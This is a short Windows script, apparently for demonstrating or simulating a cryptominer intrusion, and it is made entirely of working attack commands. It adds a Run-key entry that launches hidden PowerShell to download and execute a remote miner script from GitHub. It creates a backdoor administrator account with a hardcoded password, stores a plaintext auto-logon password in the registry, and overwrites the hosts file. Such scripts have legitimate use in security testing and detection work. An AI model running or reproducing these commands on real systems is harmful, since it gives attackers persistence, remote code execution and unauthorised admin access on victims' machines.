cmd.exe /c "reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""xMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/xminer.ps1'))"" /f"

cmd.exe /c "net user miner Mining4Ever! /add"
cmd.exe /c "net localgroup Administrators miner /add"


$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$DefaultUsername = "demo"
$DefaultPassword = "Crowdstrike2017!"
Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String

$hostsOrg = "# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost"
$hostsPath = "$env:windir\System32\drivers\etc\hosts"
Set-Content -Path $hostsPath -Value $hostsOrg
